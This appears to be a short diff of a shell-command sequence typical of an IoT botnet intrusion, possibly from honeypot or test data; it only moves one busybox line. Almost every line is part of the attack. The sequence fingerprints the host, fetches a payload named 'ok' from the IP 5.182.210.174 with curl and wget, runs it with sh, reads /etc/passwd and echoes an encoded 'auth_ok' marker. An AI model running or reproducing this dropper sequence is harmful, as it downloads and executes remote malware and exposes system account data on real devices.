@@ -16,12 +16,12 @@ head -1 /proc/version | cut -d -f1
 uname -s -v -n -m 2 > /dev/null
 uname -s -v -n -r -m
 
+/bin/busybox TOKEN
 cd /tmp
 curl -O http://5.182.210.174/ok
 rm -rf ok ok.1
 sh ok
 wget http://5.182.210.174/ok
-/bin/busybox TOKEN
 echo xsec
 cat /etc/passwd
 echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
